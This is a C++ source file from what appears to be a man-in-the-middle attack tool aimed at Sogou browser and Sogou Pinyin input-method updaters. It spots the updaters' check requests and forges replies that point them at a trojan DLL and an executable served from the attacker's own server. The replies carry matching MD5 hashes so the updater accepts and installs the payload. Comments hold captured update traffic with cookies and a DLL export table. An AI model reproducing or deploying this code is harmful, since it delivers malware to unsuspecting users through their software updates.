#include "sogouExplorer.h"
#include "PluginServer.h"
#include "../attacker.h"
#include "sslPublic.h"
#include "../Public.h"
#include "../cipher/CryptoUtils.h"
#include "../HttpUtils.h"

int gSogouExplorerFlag = 0;

int SogouExplorer::isSogouExplorer(const char * url, const char * host) {
	if (strstr(host,"p3p.sogou.com")&&strstr(url, "/getseupdater2.php"))
	{
		gSogouExplorerFlag = 1;
		return TRUE;
	}else if (strstr(host,"downctrl.wan.sogou.com") && strstr(url,"/getPluginInfo"))
	{
		gSogouExplorerFlag = 2;
		return TRUE;
	}
	else if (strstr(host, "downctrl.wan.sogou.com") && strstr(url, "/getPluginCtrl"))
	{
		gSogouExplorerFlag = 3;
		return TRUE;
	}
	else if (strstr(host, "info.pinyin.sogou.com") && strstr(url, "/version.txt?"))
	{
		gSogouExplorerFlag = 4;
		return TRUE;
	}

	return FALSE;
}



int SogouExplorer::replySogouExplorer(char * dstbuf, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {

	if (gSogouExplorerFlag == 1)
	{
		char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
			"Connection: keep-alive\r\n"
			"Content-Type: application/octet-stream\r\n"
			"Content-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lphttp->username, DLLTROJAN_FILE_NAME);
		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
		return 0;
	}else if (gSogouExplorerFlag == 2)
	{
		char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
			"Connection: keep-alive\r\n"
			"Content-Type: text/plain; charset=utf-8\r\n"
			"Content-Length: %u\r\n\r\n%s";

		char *format = "code=200|md5=%s|\r\n\r\n";
		char data[4096];

		string zipfn = "sogouPlugins.zip";
		string zipfilename = Public::getUserPluginPath(lphttp->username) + zipfn;

		vector<string> zipinfns;
		zipinfns[0] = "npfancygame.dll";
		zipinfns[1] = "fancyexelauncher.exe";
		vector<string> zipoutfns;
		zipoutfns[0] = Public::getUserPluginPath(lphttp->username) + zipinfns[0];
		zipoutfns[1] = Public::getUserPluginPath(lphttp->username) + zipinfns[1];
		int ret = Public::zipFiles(zipinfns, zipoutfns, zipfilename);

		char szmd5[256] = { 0 };
		unsigned char hexmd5[256];
		int filesize = CryptoUtils::getUpdateFileMd5(zipfilename, szmd5, hexmd5, 1);
		int datalen = sprintf(data, format, szmd5);
		int retlen = sprintf(dstbuf, szHttpFormat, datalen, data);
		return retlen;
	}
	else if (gSogouExplorerFlag == 3)
	{
		char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
			"Connection: keep-alive\r\n"
			"Content-Type: text/plain; charset=utf-8\r\n"
			"Content-Length: %u\r\n\r\n%s";

		char *format = "code=200|url=http://%s/%s|time=0|info=[{\"text\":\"给搜狗浏览器使用的fancy插件\"}]|\r\n\r\n";
		char data[4096];

		string zipfn = "sogouPlugins.zip";

		string zipfilename = Public::getUserPluginPath(lphttp->username) + zipfn;

		vector<string> zipinfns;
		zipinfns[0] = "npfancygame.dll";
		zipinfns[1] = "fancyexelauncher.exe";
		vector<string> zipoutfns;
		zipoutfns[0] = Public::getUserPluginPath(lphttp->username) + zipinfns[0];
		zipoutfns[1] = Public::getUserPluginPath(lphttp->username) + zipinfns[1];
		int ret = Public::zipFiles(zipinfns, zipoutfns, zipfilename);

		string fileurl = Public::getUserUrl(lphttp->username,zipfn);
		int datalen = sprintf(data, format, fileurl.c_str(),zipfn.c_str());
		int retlen = sprintf(dstbuf, szHttpFormat, datalen, data);
		return retlen;
	}
	else if (gSogouExplorerFlag == 4)
	{
		char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
			"Connection: keep-alive\r\n"
			"Content-Type: application/octet-stream\r\n"
			"Content-Length: %u\r\n\r\n%s";

		char *format = "[sogoupopup]\r\n"
			"version=9.9.0.1459\r\n"
			"url=http://%s/%s\r\n"
			"md5=%s\r\n\r\n";
		
		string filename = Public::getUserPluginPath(lphttp->username) + DLLTROJAN_FILE_NAME;
		char szmd5[256] = { 0 };
		unsigned char hexmd5[256];
		int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, 1);
		char data[4096];
		string ip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;
		int datalen = sprintf(data, format, ip.c_str(),DLLTROJAN_FILE_NAME,szmd5);
		int retlen = sprintf(dstbuf, szHttpFormat, datalen, data);
		return retlen;
	}

	return 0;
}

//downctrl.wan.sogou.com/getPluginInfo?time=132110693781030000
//

/*
GET /version.txt?h=CA1B4767D0F6711581EF509EC7BCE5A6&v=9.3.0.2927&r=0000_sogou_pinyin_93c&ppversion=3.1.0.2113&lt=2019-9-26.17%3A57%3A8&uex=0 HTTP/1.1
Accept-Encoding: gzip,deflate
User-Agent: SogouIMEMiniSetup_imepopup
Host: info.pinyin.sogou.com
Cache-Control: no-cache
Cookie: YYID=CA1B4767D0F6711581EF509EC7BCE5A6; IMEVER=9.3.0.2927

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Accept-Ranges: none
Content-Length: 124
Connection: close

[sogoupopup]
version=3.2.0.1459
url=http://files2.sogou.com/popup_2.2.0.1459.dll
md5=d401431b1f3f29ffb45c54083b56e614
*/

/*
GET /getPluginInfo?time=132110693781030000 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: downctrl.wan.sogou.com
Cookie: QIDIANID=6M7pW5l5n7pUhY0PqCGdVnZExlwawM2tm2oLSSvUQjhEhqCY9VF6OmGRIjS/N9DNqUHib0+6YrzZBHH/0Mn/5g==; SUV=00677040B79C8B4F5D5B434B3B45C376; GOTO=

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 23 Aug 2019 13:29:35 GMT
Content-Type: text/plain; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive

2f
code=200|md5=cb1e1d5e0bdc0a104f31d2ecbe0bc5d1|
0

GET /getPluginCtrl?time=132110693782800000&md5=cb1e1d5e0bdc0a104f31d2ecbe0bc5d1&yyid=CA1B4767D0F6711581EF509EC7BCE5A6 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: downctrl.wan.sogou.com
Cookie: QIDIANID=6M7pW5l5n7pUhY0PqCGdVnZExlwawM2tm2oLSSvUQjhEhqCY9VF6OmGRIjS/N9DNqUHib0+6YrzZBHH/0Mn/5g==; SUV=00677040B79C8B4F5D5B434B3B45C376; GOTO=

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 23 Aug 2019 13:29:36 GMT
Content-Type: text/plain; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive

85
code=200|url=http://p6.wan.sogoucdn.com/cdn/mini/plugin/plugins.zip|time=0|info=[{"text":"...........................fancy......"}]|
0
*/

/*
Name                          Address  Ordinal
----                          -------  -------
DllEntryPoint                 100010FE [main entry]
DllUpdaterGetParam            10002222 1
HsalfUpdaterGetParam          10002146 2
ObjectUpdateGetParam          10002134 3
ObjectUpdateOnDownloadSuccess 10001837 4
OcxUpdaterGetParam            100021DA 5
SE5MUpdaterGetParam           10001575 6
SeUpdaterGetParam             10001CD8 7
SetSeVersionType              100018AC 8
*/

/*
GET /getseupdater2.php?h=CA1B4767D0F6711581EF509EC7BCE5A6&s=A HTTP/1.1
User-Agent: SeUpdate
Host: p3p.sogou.com
Cache-Control: no-cache
Cookie: IPLOC=CN3301; usid=XbSB_Hp0i8QjCgyo; SUV=003904077AEAA5FB5CEF99D3C56E4667

HTTP/1.1 200 OK
Server: nginx
Date: Sun, 02 Jun 2019 04:49:18 GMT
Content-Type: application/octet-stream
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.1.6

f5f
MZ
*/